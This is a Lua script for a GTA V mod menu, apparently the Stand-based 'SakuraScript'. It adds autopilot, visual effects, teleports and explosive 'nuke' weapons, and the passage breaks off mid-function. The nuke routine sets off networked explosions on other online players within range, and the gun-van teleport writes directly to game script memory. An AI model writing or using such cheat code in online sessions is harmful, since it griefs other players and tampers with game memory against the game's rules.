function drivestylee(index, menu_name, prev_value, click_type)
    drivestyle = drivestyletables[index]
end
function drivespeedd(value)
    drivespeed = value
end
function Auto_driving(toggle)
    Auto_drived_toggled = toggle
    while Auto_drived_toggled do
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID())
        if HUD.IS_WAYPOINT_ACTIVE() then
            local waypoint = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            auto_driving_to_coord(PLAYER.PLAYER_PED_ID(), waypoint.x, waypoint.y, waypoint.z, drivespeed, drivestyle, 0.0)
        end
        util.yield(1000)
    end
    TASK.CLEAR_PED_TASKS(PLAYER.PLAYER_PED_ID()) --清除驾驶task
end

-----特斯拉自动驾驶
function Tesla_Autopilot(toggled)
    local player = PLAYER.PLAYER_PED_ID()
    local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
        if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
            local vehicle = PED.GET_VEHICLE_PED_IS_IN(player, false)
            delete_entity(vehicle)
        end
        tesla_ai_ped = PED.CLONE_PED(PLAYER.PLAYER_PED_ID(), true, false, true)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true)
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(player, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            delete_entity(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            delete_entity(tesla_vehicle)
        end
    end
end


-----载具效果
local vfxselectedOpt = 1
function selectedOptt(index, menu_name, prev_value, click_type)
    vfxselectedOpt = index 
end
function vehicle_effectt()
    local effectd = veffects[vfxselectedOpt]
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
    if ENTITY.DOES_ENTITY_EXIST(vehicle) and not ENTITY.IS_ENTITY_DEAD(vehicle, false) and
        VEHICLE.IS_VEHICLE_DRIVEABLE(vehicle, false) and timer.elapsed() > effectd[4] then
            request_ptfx_asset(effectd[1])
        for _, boneName in pairs({"wheel_lf", "wheel_lr", "wheel_rf", "wheel_rr"}) do
            local bone = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicle, boneName)
            GRAPHICS.USE_PARTICLE_FX_ASSET(effectd[1])
            GRAPHICS.START_PARTICLE_FX_NON_LOOPED_ON_ENTITY_BONE(
                effectd[2],
                vehicle,
                0.0, 0.0, 0.0,
                0.0, 0.0, 0.0,
                bone,
                effectd[3],
                false, false, false
            )
        end
        timer.reset()
    end
end


------天基炮
function nuclear_weapon1()
    local last_hit_coords = v3.new()
	if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), last_hit_coords) then
        request_ptfx_asset("scr_xm_orbital")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_xm_orbital")
        FIRE.ADD_EXPLOSION(last_hit_coords.x, last_hit_coords.y, last_hit_coords.z, 59, 1, true, false, 1.0, false)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", last_hit_coords.x, last_hit_coords.y, last_hit_coords.z, 0, 180, 0, 1.0, true, true, true)
        for i = 1, 4 do
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "DLC_XM_Explosions_Orbital_Cannon", PLAYER.PLAYER_PED_ID(), 0, true, 0)
        end
	end
end
-----核弹
function get_distance_between(pos1, pos2)
	if math.type(pos1) == "integer" then
		pos1 = ENTITY.GET_ENTITY_COORDS(pos1)
	end
	if math.type(pos2) == "integer" then 
		pos2 = ENTITY.GET_ENTITY_COORDS(pos2)
	end
	return pos1:distance(pos2)
end
function nuke_expl1(Position)
    local offsets = {
        {10, 0, 0}, {0, 10, 0}, {10, 10, 0}, {-10, 0, 0}, {0, -10, 0}, {-10, -10, 0}, {10, -10, 0}, {-10, 10, 0},
        {20, 0, 0}, {0, 20, 0}, {20, 20, 0}, {-20, 0, 0}, {0, -20, 0}, {-20, -20, 0}, {20, -20, 0}, {-20, 10, 0},
        {30, 0, 0}, {0, 30, 0}, {30, 30, 0}, {-30, 0, 0}, {0, -30, 0}, {-30, -30, 0}, {30, -30, 0}, {-30, 10, 0},
        {10, 30, 0}, {30, 10, 0}, {-30, -10, 0}, {-10, -30, 0}, {-10, 30, 0}, {-30, 10, 0}, {30, -10, 0}, {10, -30, 0},
        {0, 0, 10}, {0, 0, -10}, {0, 0, 20}, {0, 0, -20}
    }
    for _, offset in ipairs(offsets) do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end
function nuke_expl2(Position)
    local offsets = {{0,0,-10}, {10,0,-10}, {0,10,-10}, {10,10,-10}, {-10,0,-10}, {0,-10,-10}, {-10,-10,-10}, {10,-10,-10}, {-10,10,-10}}
    for _, offset in ipairs(offsets) do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end
function nuke_expl3(Position)
    local offsets = {{10,0,0}, {0,10,0}, {10,10,0}, {-10,0,0}, {0,-10,0}, {-10,-10,0}, {10,-10,0}, {-10,10,0}, {0,0,0}}
    for _, offset in ipairs(offsets) do
        FIRE.ADD_EXPLOSION(Position.x + offset[1], Position.y + offset[2], Position.z + offset[3], 59, 1.0, true, false, 1.0, false)
    end
end
function create_nuke_explosion(Position)
    for count = 1, 17 do
        if count == 1 then
	        FIRE.ADD_EXPLOSION(Position.x, Position.y, Position.z, 59, 1, true, false, 5.0, false)
        elseif count == 2 then
            FIRE.ADD_EXPLOSION(Position.x, Position.y, Position.z, 59, 1, true, false, 1.0, false)
        end
		request_ptfx_asset("scr_xm_orbital")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_xm_orbital")
	    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", Position.x, Position.y, Position.z, 0, 180, 0, 4.5, true, true, true)
    end
    nuke_expl1(Position)
	for i = 1, 4 do
		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "DLC_XM_Explosions_Orbital_Cannon", PLAYER.PLAYER_PED_ID(), 0, true, 0)
	end
    for count = 1, 2 do
        if count == 1 then
	        FIRE.ADD_EXPLOSION(Position.x, Position.y, Position.z-10, 59, 1, true, false, 5.0, false)
        end
		request_ptfx_asset("scr_xm_orbital")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_xm_orbital")
	    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", Position.x, Position.y, Position.z-10, 0, 180, 0, 4.5, true, true, true)
    end
    nuke_expl2(Position)
    local size = 1.5
    local positionsZ = {1, 3, 5, 7, 10, 12, 15, 17, 20, 22, 25, 27, 30, 32, 35, 37, 40, 42, 45, 47, 50, 52, 55, 57, 59, 61, 63, 65, 70, 75, 75, 75, 75, 80, 80}
    for i, pos in ipairs(positionsZ) do
        if i == 3 or i == 5 or i == 7 or i == 9 or i == 11 or i == 13 or i == 15 or i == 17 or i == 19 or i == 21 or i == 23 or i == 25 or i == 29 or i == 30 then
        FIRE.ADD_EXPLOSION(Position.x, Position.y, Position.z+pos, 59, 1.0, true, false, 1.0, false)
        end
        request_ptfx_asset("scr_xm_orbital")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_xm_orbital")
	    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", Position.x, Position.y, Position.z+pos, 0, 180, 0, size, true, true, true)

        if i >= 30 and i <= 33 then size = 3.5
        elseif i >= 34 and i <= 35 then size = 3.0
        else size = 1.5 end
        util.yield(10)
    end
    nuke_expl3(Position)
	for _, pid in pairs(players.list(false, true, true)) do
        local distance = get_distance_between(players.get_position(pid), Position)
		if distance < 200 then
			local pid_pos = players.get_position(pid)
			FIRE.ADD_EXPLOSION(pid_pos.x, pid_pos.y, pid_pos.z, 59, 1.0, true, false, 1.0, false)
		end
	end
	local peds = entities.get_all_peds_as_handles()
	for _, ped in pairs(peds) do
		if get_distance_between(ped, Position) > 200 and get_distance_between(ped, Position) < 400 and ped ~= PLAYER.PLAYER_PED_ID() then
			local ped_pos = ENTITY.GET_ENTITY_COORDS(ped)
			FIRE.ADD_EXPLOSION(ped_pos.x, ped_pos.y, ped_pos.z, 3, 1.0, true, true, 0.1, false)
		end
	end
	local vehicles = entities.get_all_vehicles_as_handles()
    for _, vehicle in pairs(vehicles) do
		if get_distance_between(vehicle, Position) < 400 then
			VEHICLE.EXPLODE_VEHICLE(vehicle, true, false)
		elseif get_distance_between(vehicle, Position) > 200 and get_distance_between(vehicle, Position) < 400 then
			VEHICLE.EXPLODE_VEHICLE(vehicle, true, false)
		end
	end
end
function nuclear_weapon2()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
		local hash = util.joaat("prop_military_pickup_01")
		request_model(hash)
		local player_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 5.0, 3.0)
		local dir = {}
		local c2 = {}
		c2 = get_offset_from_camera(1000)
		dir.x = (c2.x - player_pos.x) * 1000
		dir.y = (c2.y - player_pos.y) * 1000
		dir.z = (c2.z - player_pos.z) * 1000
		local nuke = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, player_pos.x, player_pos.y, player_pos.z, true, false, false)
		ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(nuke, PLAYER.PLAYER_PED_ID(), false)
		ENTITY.APPLY_FORCE_TO_ENTITY(nuke, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
		ENTITY.SET_ENTITY_HAS_GRAVITY(nuke, true)
		while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(nuke) and not ENTITY.IS_ENTITY_IN_WATER(nuke) do
			util.yield(0)
		end
		local nukePos = ENTITY.GET_ENTITY_COORDS(nuke, true)
		delete_entity(nuke)
        create_nuke_explosion(nukePos)
	end
end





----护送核弹车
function escort_nuke(on,pid)
    if on then
        local ped = PLAYER.GET_PLAYER_PED(pid)
        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)
        local hash = util.joaat("tiptruck")
        request_model(hash)
        nuketruck = VEHICLE.CREATE_VEHICLE(hash, pos.x , pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(ped), true, false, true)
        local hash2 = util.joaat("prop_military_pickup_01")
        request_model(hash2)
        local truck_pos = ENTITY.GET_ENTITY_COORDS(nuketruck, true)
        local truck_rot = ENTITY.GET_ENTITY_ROTATION(nuketruck, 0)
        esnuke = OBJECT.CREATE_OBJECT_NO_OFFSET(hash2, truck_pos.x, truck_pos.y, truck_pos.z + 2, true, false, true)
        ENTITY.SET_ENTITY_HAS_GRAVITY(esnuke, true)
        ENTITY.SET_ENTITY_ROTATION(esnuke, truck_rot.x, truck_rot.y, truck_rot.z+90, 0, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(esnuke, nuketruck, 0, 0.0, -1.5, 1.7, 0.0, 0.0, 90.0, false, false, false, false, 2, true, 0)
        util.create_tick_handler(function()
            if VEHICLE.GET_VEHICLE_ENGINE_HEALTH(nuketruck) <= 0 and ENTITY.DOES_ENTITY_EXIST(esnuke) then
                local nukePos = ENTITY.GET_ENTITY_COORDS(esnuke, true)
                delete_entity(esnuke)
                create_nuke_explosion(nukePos)
                menu.set_value(safe_nuke, false)
                util.toast("核弹已被引爆")
                return false
            end
        end)
    else
        if ENTITY.DOES_ENTITY_EXIST(esnuke) then
            delete_entity(esnuke)
        end
        if ENTITY.DOES_ENTITY_EXIST(nuketruck) then
            delete_entity(nuketruck)
        end
    end
end



----运输核弹
function transport_nuke()
    local msg = "~y~按 ~%s~ 投掷核弹"
    util.show_corner_help(msg:format("INPUT_VEH_HORN"))
    local ped = PLAYER.PLAYER_PED_ID()
    local hash = util.joaat("prop_military_pickup_01")
    local pos = players.get_position(PLAYER.PLAYER_ID())
    request_model(util.joaat("skylift"))
    request_model(hash)
    local skylift = VEHICLE.CREATE_VEHICLE(util.joaat("skylift"), pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(ped), true, false, false)
    PED.SET_PED_INTO_VEHICLE(ped, skylift, -1)
    local nuke = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y, pos.z, true, false, true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(nuke, true, true)--防止消失
    ENTITY.ATTACH_ENTITY_TO_ENTITY(nuke, skylift, 0, 0, -2.8, -1.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true, 0)
    while true do
        local skyliftPos = ENTITY.GET_ENTITY_COORDS(skylift, true)
        local strg = "~b~ Elevation ~w~"..math.ceil(skyliftPos.z)
        draw_string(strg, 0.03, 0.1, 0.6, 4)
        if PAD.IS_CONTROL_PRESSED(0,46) then
            if ENTITY.IS_ENTITY_ATTACHED(nuke) then
                ENTITY.DETACH_ENTITY(nuke, true, true)
                notification("~bold~~y~炸弹已投放", HudColour.blue)
            end
            ENTITY.APPLY_FORCE_TO_ENTITY(nuke, 3, 0.0, 0.0, -50, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
            ENTITY.SET_ENTITY_HAS_GRAVITY(nuke, true)
            while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(nuke) and not ENTITY.IS_ENTITY_IN_WATER(nuke) do
                util.yield(0)
            end
            if ENTITY.DOES_ENTITY_EXIST(nuke) then
                local nukePos = ENTITY.GET_ENTITY_COORDS(nuke, true)
                delete_entity(nuke)
                create_nuke_explosion(nukePos)
                notification("~bold~~y~核弹已爆炸", HudColour.blue)
                break
            end
        end
        util.yield()
    end
end



------前滚翻
local i_forward = 360
function forward_roll()
    request_anim_dict("misschinese2_crystalmaze")
    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), "misschinese2_crystalmaze", "2int_loop_a_taotranslator", 8.0, 8.0, -1, 0, 0.0, 0, 0, 0)
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local user_rot = ENTITY.GET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), 0)
    local fwd_vect = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
    local speed = ENTITY.GET_ENTITY_SPEED(PLAYER.PLAYER_PED_ID()) * 2.236936
    PED.SET_PED_CAN_RAGDOLL(PLAYER.PLAYER_PED_ID(), false)
    ENTITY.SET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), i_forward, user_rot.y, cam_rot.z, 2, true)
    if speed <= 70 then
        ENTITY.APPLY_FORCE_TO_ENTITY(PLAYER.PLAYER_PED_ID(), 3, fwd_vect.x, fwd_vect.y, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, false)
    end
    if i_forward <= 0 then i_forward = 360 else i_forward = i_forward - 6 end 
end
function end_forward_roll()
    util.yield(100)
    PED.SET_PED_CAN_RAGDOLL(PLAYER.PLAYER_PED_ID(), true)
    TASK.STOP_ANIM_TASK(PLAYER.PLAYER_PED_ID(), "misschinese2_crystalmaze", "2int_loop_a_taotranslator", 1)
end

----街舞
local danrotation = 0
local danloop_count = 0
function breakdance()
    local dict, name
    if danloop_count <= 200 then
        dict = "missfbi5ig_20b"
        name = "hands_up_scientist"
    elseif danloop_count <= 400 then
        dict = "nm@hands"
        name = "hands_up"
    elseif danloop_count <= 600 then
        dict = "missheist_agency2ahands_up"
        name = "handsup_anxious"
    elseif danloop_count <= 800 then
        dict = "missheist_agency2ahands_up"
        name = "handsup_loop"
    end
    ENTITY.SET_ENTITY_ROTATION(PLAYER.PLAYER_PED_ID(), 180, 0, danrotation, 1, true)
    request_anim_dict(dict)
    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), dict, name, 8.0, 0, -1, 0, 0.0, 0, 0, 0)
    danrotation = danrotation + 5
    if danloop_count < 1000 then
        danloop_count = danloop_count + 1
    else
        danloop_count = 0
    end
end
function end_breakdance()
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
end



----传送到最近玩家
function getClosestPlayer(myPos)
    local closestDist = 1000000
    local closest_player = nil
    for pid = 0, 31 do
		local ped = PLAYER.GET_PLAYER_PED(pid)
		if not ENTITY.IS_ENTITY_DEAD(ped) and ped ~= 0 and ped ~= PLAYER.PLAYER_PED_ID() then
            local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local dist = myPos:distance(playerpos)
            if dist < closestDist then
                closestDist = dist
                closest_player = pid
            end
		end
    end
    return closest_player
end
function tp_closest_player()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
	local player = getClosestPlayer(pos)
    if PLAYER.GET_PLAYER_PED(player) ~= 0 and player ~= nil then
        local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(player), false)
        ENTITY.SET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), player_pos.x, player_pos.y, player_pos.z, false, false, false, false)
    end
end



-----金色翅膀
function Golden_wings(on)
    if on then	
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        Gowings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(Gowings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true, 0)
    else
        delete_entity(Gowings)
    end
end

-----银色翅膀
function argent_wings(on)
    if on then	
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
        argwings = OBJECT.CREATE_OBJECT(-112384661, pos.x, pos.y, pos.z, true, true, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-112384661)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(argwings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true, 0)
    else
        delete_entity(argwings)
    end
end




----火翅膀
local firewing = {}
function fireWing(toggled)
    if toggled then
        if firewing[1] then return end
        local fireWingr = 255;local fireWingg = 165;local fireWingb = 50
        local dictionary = "weap_xs_vehicle_weapons"
        local ptfx_name = "muz_xs_turret_flamethrower_looping"
        for i = 1, #fireWings do
            request_ptfx_asset(dictionary)
            GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
            firewing[i] = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY(ptfx_name, PLAYER.PLAYER_PED_ID(), 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], 0.2, false, false, false)
            --GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(firewing[i], 0.3)
            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(firewing[i], fireWingr, fireWingg, fireWingb, false)		
        end			
    else
        for i = 1, #fireWings do
            if firewing[i] then
                GRAPHICS.STOP_PARTICLE_FX_LOOPED(firewing[i], false)
                GRAPHICS.REMOVE_PARTICLE_FX(firewing[i], false)
                firewing[i] = nil
            end
        end
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
    end
end
----彩色翅膀
local color_firewing = {}
function colorful_fireWing(toggled)
    if toggled then
        for i = 1, #fireWings do
            request_ptfx_asset('weap_xs_vehicle_weapons')
            GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
            color_firewing[i] = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', PLAYER.PLAYER_PED_ID(), 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], 0.2, false, false, false)
            util.create_tick_handler(function()
                if #color_firewing < 1 then return false end
                for v = 1, #fireWings do
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(color_firewing[v], 0.3)
                    local timer = MISC.GET_GAME_TIMER()
                    local colorful_color = gradient_colour(timer, 1)
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(color_firewing[v], colorful_color.r/255, colorful_color.g/255, colorful_color.b/255, false)
                end
            end)				
        end			
    else
        for i = 1, #fireWings do
            if color_firewing[i] then
                GRAPHICS.STOP_PARTICLE_FX_LOOPED(color_firewing[i], false)
                GRAPHICS.REMOVE_PARTICLE_FX(color_firewing[i], false)
                color_firewing[i] = nil
            end
        end
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
    end
end
----XP火翅膀
function xp_fireWing(toggled)
    xp_toggled = toggled
    if xp_toggled then
        while xp_toggled do
            local fireWingr = 255;local fireWingg = 165;local fireWingb = 50
            local dictionary = "core"
            local ptfx_name = "ent_sht_flame"
            local pos1 = 65;local pos2 = 75;
            local posz = {-0.2, -0.2, 0, 0, 0.2, 0.2, 0.4, 0.4, 0.6, 0.6}
            for i = 1, 8 do
                request_ptfx_asset(dictionary)
                GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(ptfx_name, PLAYER.PLAYER_PED_ID(), 0, 0, posz[i], pos1, 0, pos2, 1, false, false, false)
                GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(fireWingr, fireWingg, fireWingb)	
                pos2 = pos2 * -1
            end
            util.yield(3500)
        end
    else
        GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
    end
end

-----钢铁侠
function Iron_Man1(toggled)
    Iron_Man_toggled = toggled
    
    local context = CAM.GET_CAM_ACTIVE_VIEW_MODE_CONTEXT()
    local startViewMode = CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context)
    while Iron_Man_toggled do
        --给予头盔
        if not PED.IS_PED_WEARING_HELMET(PLAYER.PLAYER_PED_ID()) then
            PED.GIVE_PED_HELMET(PLAYER.PLAYER_PED_ID(), true, 4096, -1)
        end

        menu.trigger_commands("levitate on")
        PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(),false) --禁止切换武器
        WEAPON.SET_CURRENT_PED_WEAPON(PLAYER.PLAYER_PED_ID(), -1569615261, true)----给予徒手

        if CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context) ~= 4 then
            CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(context, 4)
        end

        --动画
        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD'), 'REMOTE_SNIPER_HUD')
        GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD'), 255, 255, 255, 255, 0)
        GRAPHICS.END_SCALEFORM_MOVIE_METHOD()
        
        --显示按键
        display_buttons({{0, 46, '火箭弹'},{1, 25, '原子枪'},{2, 18, '机炮'}})
        --按键禁止
        disable_control_action(140, 103, 24, 25)
        
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        local b = get_offset_from_camera(80)
        local hash
        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 24) then --LEFT MOUSE
            hash = util.joaat('VEHICLE_WEAPON_PLAYER_LAZER')
            request_weapon_asset(hash)

        elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 25) then
            hash = util.joaat('WEAPON_RAYPISTOL')
            request_weapon_asset(hash)
            if not WEAPON.HAS_PED_GOT_WEAPON(PLAYER.PLAYER_PED_ID(), hash, false) then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 9999, false, false)
            end

        elseif PAD.IS_DISABLED_CONTROL_PRESSED(0, 38) then
            hash = util.joaat('WEAPON_RPG')
            request_weapon_asset(hash)
            if not WEAPON.HAS_PED_GOT_WEAPON(PLAYER.PLAYER_PED_ID(), hash, false) then
                WEAPON.GIVE_WEAPON_TO_PED(PLAYER.PLAYER_PED_ID(), hash, 9999, false, false)
            end
            pos.x = pos.x + math.random(0, 100) / 100
            pos.y = pos.y + math.random(0, 100) / 100
            pos.z = pos.z + math.random(0, 100) / 100
        end
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, b.x, b.y, b.z,200, true, hash, PLAYER.PLAYER_PED_ID(), true, true, -1.0)

        util.yield()
    end

    PED.REMOVE_PED_HELMET(PLAYER.PLAYER_PED_ID(), true) --移除头盔
    PED.SET_PED_CAN_SWITCH_WEAPON(PLAYER.PLAYER_PED_ID(), true) --允许切换武器
    --重置动画
    local pScaleform = memory.alloc_int()
    memory.write_int(pScaleform, GRAPHICS.REQUEST_SCALEFORM_MOVIE('REMOTE_SNIPER_HUD'))
    GRAPHICS.SET_SCALEFORM_MOVIE_AS_NO_LONGER_NEEDED(pScaleform)
    menu.trigger_commands("levitate off")

    --恢复视角
    CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(CAM.GET_CAM_ACTIVE_VIEW_MODE_CONTEXT(), startViewMode)
end



----传送到厢型车
function get_closest_vehicle_node(coords, nodeType)
    local outCoords = v3.new()
    local outHeading = memory.alloc(4)
    if PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(coords.x, coords.y, coords.z,
            memory.addrof(outCoords), outHeading, nodeType, 3.0, 0) then
        return true, outCoords, memory.read_float(outHeading)
    else
        return false
    end
end
function tp_gun_van()
    if not HUD.DOES_BLIP_EXIST(HUD.GET_FIRST_BLIP_INFO_ID(844)) then
        local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        local bool, spawn_point, heading = get_closest_vehicle_node(coords, 1)
        if bool then
            local Addr = memory.script_global(Global_Base.gun_van)
            if Addr ~= 0 then
                memory.write_vector3(Addr, spawn_point)
            end
        end
    end
    condition_wait(not HUD.DOES_BLIP_EXIST(HUD.GET_FIRST_BLIP_INFO_ID(844)), 3)
    local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(844))
    teleport(pos.x, pos.y, pos.z, false)
end


-----绘制控制台
local log_dir = filesystem.stand_dir() .. '\\Log.txt'
local full_stdout = ""
local disp_stdout = ""
local max_chars = 110
local max_lines = 25
local font_size = 0.45
function console_max_chars(s)
    max_chars = s
end
function console_max_lines(s)
    max_lines = s
end
function console_font_size(s)
    font_size = s*0.01
end
function get_stand_stdout(tbl, n)
    local all_lines = {}
    local disp_lines = {}
    local size = #tbl
    local index = 1
    if size >= n then 
        index = #tbl - n
    end
    for i=index, size do 
        local line = tbl[i]
        local line_copy = line
        if line ~= "" and line ~= '\n' then
            all_lines[#all_lines + 1] = line
            if string.len(line) > max_chars then
                disp_lines[#disp_lines + 1] = line:sub(1, max_chars) .. ' ...'
            else
                disp_lines[#disp_lines + 1] = line
            end
        end
    end
    full_stdout = table.concat(all_lines, '\n')
    disp_stdout = table.concat(disp_lines, '\n')
end
function get_last_lines(file)
    local f = io.open(file, "r")
    local len = f:seek("end")
    f:seek("set", len - max_lines*1000)
    local text = f:read("*a")
    lines = string.split(text, '\n')
    f:close()
    get_stand_stdout(lines, max_lines)
end
console_bg_color = {r = 0, g = 0, b = 0, a = 0.5}
console_text_color = {r = 0.28, g = 1, b = 1, a = 1}
function Draw_console()
    local text = get_last_lines(log_dir)
    local size_x, size_y = directx.get_text_size(disp_stdout, font_size)
    size_x = size_x + 0.01
    size_y = size_y + 0.01
    directx.draw_rect(0.0, 0.05, size_x, size_y, console_bg_color)
    directx.draw_text(0.0, 0.05, disp_stdout, 0, font_size, console_text_color, true)
end




--------游戏水印
local icon = directx.create_texture(filesystem.resources_dir() .. 'SakuraScript\\watermark\\icon.jpg')
function watermark_x(x_)
